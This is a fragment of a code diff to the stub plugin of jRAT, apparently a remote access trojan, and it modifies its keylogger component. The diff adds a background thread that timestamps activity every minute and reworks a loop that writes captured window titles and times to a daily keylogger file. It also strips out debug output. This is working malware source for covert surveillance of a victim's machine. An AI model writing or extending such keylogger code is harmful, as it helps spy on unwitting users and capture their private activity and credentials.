@@ -185,15 +185,25 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 			public void run() {
 				while (true) {
 					try {
+						Thread.sleep(1000L * 60L);
+						Activities.add(new Time(System.currentTimeMillis()));
+					} catch (Exception ex) {
+						ex.printStackTrace();
+					}
+				}
+			}
+		}).start();
+		
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				while (true) {
+					try {
 						Thread.sleep(1000L);
 						
 						PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(Keylogger.getTodaysFile(), true)));
-						
-						Activities.add(new Time(System.currentTimeMillis()));
-						
+										
 						for (Activity a : Activities.activities) {
-							System.out.println(a.toString());
-							System.out.println(a.getClass().getSimpleName());
 							if (a instanceof Title) {
 								out.println("\n[Window: " + a.toString() + "]\n");
 							} else if (a instanceof Time) {
